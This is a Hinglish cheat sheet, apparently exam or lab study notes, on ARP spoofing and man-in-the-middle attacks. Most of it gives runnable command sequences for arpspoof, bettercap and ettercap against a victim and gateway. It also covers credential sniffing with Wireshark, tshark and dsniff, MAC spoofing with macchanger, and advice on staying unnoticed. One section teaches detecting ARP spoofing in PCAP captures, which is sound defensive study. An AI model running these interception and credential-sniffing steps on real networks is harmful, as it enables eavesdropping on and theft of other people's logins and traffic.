# ARP SPOOFING / MITM ATTACK

---

## Pehle Samjho: ARP Kya Hai?

**ARP = Address Resolution Protocol.** Ye IP address ko MAC address mein convert karta hai.

**Real life example:**
Socho tumhara laptop (192.168.1.5) Google (via gateway 192.168.1.1) se baat karna chahta hai.
1. Laptop broadcast karega: "192.168.1.1 kaun hai? Apna MAC address batao!"
2. Router reply karega: "Main hoon 192.168.1.1, mera MAC hai AA:BB:CC:DD:EE:FF"
3. Laptop ye mapping save kar leta hai **ARP table** mein
4. Ab sab packets AA:BB:CC:DD:EE:FF (router MAC) ko bheje jaate hain

**ARP table** = IP-to-MAC mapping ka cache. `arp -a` se dekh sakte ho.

---

## ARP Spoofing Kaise Kaam Karta Hai?

**Problem:** ARP mein koi authentication nahi hai! Koi bhi bol sakta hai "Main gateway hoon!"

**Attack flow:**
```
Normal:
  Victim (192.168.1.5) ──packets──→ Router (192.168.1.1)

ARP Spoof ke baad:
  Victim (192.168.1.5) ──packets──→ Attacker (192.168.1.10) ──forward──→ Router (192.168.1.1)
```

**Step by step:**
1. Attacker victim ko bolta hai: "192.168.1.1 (gateway) ka MAC mera hai" (fake ARP reply)
2. Attacker router ko bolta hai: "192.168.1.5 (victim) ka MAC mera hai" (fake ARP reply)
3. Ab victim ka SAARA traffic attacker ke through jaata hai
4. Attacker traffic dekh sakta hai, modify kar sakta hai, phir forward kar deta hai
5. Victim aur router ko pata bhi nahi chalta — yehi hai **Man-in-the-Middle (MITM)**!

**IP Forwarding kyun zaruri hai?** Bina forwarding ke victim ka traffic tumhare paas aayega lekin aage nahi jayega — victim ka internet band ho jayega aur suspicious lagega!

---

## CASE 1: ARP Spoof with arpspoof (Classic Method)

```bash
# Step 1: IP forwarding ON karo (BAHUT ZARURI!)
echo 1 > /proc/sys/net/ipv4/ip_forward
# Verify: cat /proc/sys/net/ipv4/ip_forward → "1" hona chahiye

# Step 2: Victim ko bolo ki tum gateway ho (Terminal 1)
arpspoof -i eth0 -t <VICTIM_IP> <GATEWAY_IP>
# Example: arpspoof -i eth0 -t 192.168.1.5 192.168.1.1

# Step 3: Gateway ko bolo ki tum victim ho (Terminal 2)
arpspoof -i eth0 -t <GATEWAY_IP> <VICTIM_IP>
# Example: arpspoof -i eth0 -t 192.168.1.1 192.168.1.5
```

**Dono terminals running rehne do!** Band kiya toh spoof khatam.

**Output kya dikhega:**
```
0:11:22:33:44:55 ff:ff:ff:ff:ff:ff arp reply 192.168.1.1 is-at 0:11:22:33:44:55
```
Ye har kuch second repeat hoga — matlab spoofed ARP replies bhej rahe ho.

**Kaise verify karo ki kaam kar raha hai?**
Victim machine pe `arp -a` run karo — gateway ka MAC address tumhara MAC dikhna chahiye!

---

## CASE 2: Bettercap — Modern All-in-One Tool

```bash
# Step 1: Bettercap start karo
bettercap -iface eth0

# Step 2: Network discover karo
> net.probe on
# Ye subnet mein sabhi devices dhundhega

# Step 3: Devices list dekho
> net.show
# Saare devices dikhenge with IP aur MAC

# Step 4: Sniffing ON karo
> net.sniff on
# Ab sab traffic capture hoga

# Step 5: ARP Spoof target set karo
> set arp.spoof.targets <VICTIM_IP>
# Example: set arp.spoof.targets 192.168.1.5

# Step 6: ARP Spoof start karo
> arp.spoof on

# Step 7 (Optional): Full duplex spoof
> set arp.spoof.fullduplex true
> arp.spoof on
```

**Bettercap kyun better hai?**
- Ek hi tool mein sab kuch — discovery, spoofing, sniffing
- Auto IP forwarding (manually karne ki zarurat nahi)
- HTTP/HTTPS traffic analyze kar sakta hai
- Credentials auto-detect karta hai

**Credentials dikhenge jaise:**
```
[net.sniff.http] http://192.168.1.5 > POST /login username=admin&password=secret123
```

---

## CASE 3: Ettercap — GUI + CLI MITM Tool

```bash
# CLI mode (quick):
ettercap -T -q -i eth0 -M arp:remote /<VICTIM_IP>// /<GATEWAY_IP>//
# -T = text mode
# -q = quiet (less output)
# -M arp:remote = ARP spoofing MITM mode

# Example:
ettercap -T -q -i eth0 -M arp:remote /192.168.1.5// /192.168.1.1//

# GUI mode:
ettercap -G
# Sniff → Unified Sniffing → eth0
# Hosts → Scan for hosts
# Select Target 1 (victim) + Target 2 (gateway)
# Mitm → ARP poisoning → Start
```

**Ettercap special features:**
- Built-in credential sniffer
- Plugin system (DNS spoofing, etc.)
- GUI mode beginners ke liye easy

---

## CASE 4: Sniffing Credentials During MITM

MITM active hai — ab traffic mein credentials dhundho:

```bash
# Method 1: Wireshark se
wireshark -i eth0 &
# Filters:
# HTTP credentials: http.request.method == POST
# FTP credentials: ftp.request.command == USER || ftp.request.command == PASS
# Telnet: telnet
# HTTP Basic Auth: http.authorization

# Method 2: tshark se (CLI)
tshark -i eth0 -Y "http.request.method==POST" -T fields -e http.host -e http.request.uri -e urlencoded-form.value

# Method 3: Bettercap auto-detect karta hai
# net.sniff on ke baad credentials automatically dikhenge

# Method 4: dsniff (dedicated credential sniffer)
dsniff -i eth0
# HTTP, FTP, Telnet, POP3 passwords automatically dikhayega
```

**Kya capture ho sakta hai?**
- HTTP login forms (username/password)
- FTP credentials (plain text!)
- Telnet sessions (plain text!)
- POP3/IMAP email passwords
- HTTP Basic Authentication

**Kya NAHI capture hoga?**
- HTTPS traffic (encrypted) — unless SSL stripping karo
- SSH traffic (encrypted)

---

## CASE 5: PCAP Mein ARP Spoof Detect Karo

Exam mein PCAP file di ho aur puchha ho "ARP spoofing detect karo":

```bash
# Method 1: tshark se — same IP ke multiple MACs dhundho
tshark -r capture.pcap -Y "arp.opcode==2" -T fields -e arp.src.proto_ipv4 -e arp.src.hw_mac | sort | uniq -c | sort -rn
```

**Output samjho:**
```
  150  192.168.1.1   aa:bb:cc:dd:ee:ff    ← genuine router MAC
   85  192.168.1.1   11:22:33:44:55:66    ← ATTACKER! Same IP, different MAC!
```
**Ek IP ke liye do alag MAC addresses = ARP SPOOFING CONFIRMED!**

```bash
# Method 2: Wireshark mein
# Filter: arp
# Dekho: "Duplicate IP address" ya "ARP who-has" bahut zyada
# Ek IP ke reply mein do different MACs = spoof

# Method 3: Gratuitous ARP detect karo
tshark -r capture.pcap -Y "arp.isgratuitous==1"
# Bahut saare gratuitous ARP = suspicious (someone announcing false mappings)

# Method 4: ARP storm detect
tshark -r capture.pcap -Y "arp" | wc -l
# Normal network mein thode ARP packets hote hain
# Bahut zyada = ARP spoofing
```

**Wireshark Expert Info bhi check karo:**
Analyze → Expert Information → Warnings mein "Duplicate IP address detected" dikhega.

---

## CASE 6: MAC Address Change (Bonus)

```bash
# Interface down karo
ifconfig eth0 down

# MAC change karo
macchanger -r eth0                  # random MAC
macchanger -m AA:BB:CC:DD:EE:FF eth0    # specific MAC

# Interface up karo
ifconfig eth0 up

# Verify
macchanger -s eth0
```

---

## Common Mistakes (Mat Karna Ye)

1. **IP forwarding ON nahi kiya:** Bina forwarding ke victim ka internet band ho jayega = suspicious!
2. **Dono direction spoof nahi kiya:** Sirf victim ko spoof kiya, gateway ko nahi = half MITM, incomplete traffic capture
3. **Interface galat:** `eth0` ki jagah `wlan0` ho sakta hai — `ifconfig` se check karo
4. **HTTPS expect kar rahe ho:** HTTP credentials hi capture hoge mostly — HTTPS encrypted hai
5. **PCAP analysis mein ARP opcode bhool gaye:** `arp.opcode==2` = ARP reply. Replies mein spoof detect hota hai
6. **Same subnet pe nahi ho:** ARP sirf local network (same subnet) mein kaam karta hai — remote targets pe nahi

---

## Quick Decision Tree

```
MITM / ARP Spoofing question?
  │
  ├─ ARP Spoof KARNA hai?
  │    ├─ IP forwarding ON: echo 1 > /proc/sys/net/ipv4/ip_forward
  │    ├─ Tool choose karo:
  │    │    ├─ Simple: arpspoof (2 terminals)
  │    │    ├─ All-in-one: bettercap
  │    │    └─ GUI: ettercap -G
  │    └─ Credentials sniff karo: wireshark/dsniff/bettercap
  │
  ├─ PCAP mein ARP spoof DETECT karna hai?
  │    ├─ tshark: same IP, different MACs dhundho
  │    ├─ Wireshark: arp filter → duplicate IP detect
  │    └─ Gratuitous ARP packets bahut zyada = spoof
  │
  ├─ Credentials extract karne hain?
  │    ├─ HTTP POST: http.request.method==POST
  │    ├─ FTP: ftp.request.command
  │    ├─ Telnet: telnet filter
  │    └─ dsniff -i eth0 (auto-detect)
  │
  └─ MAC change karna hai?
       └─ macchanger -r eth0
```
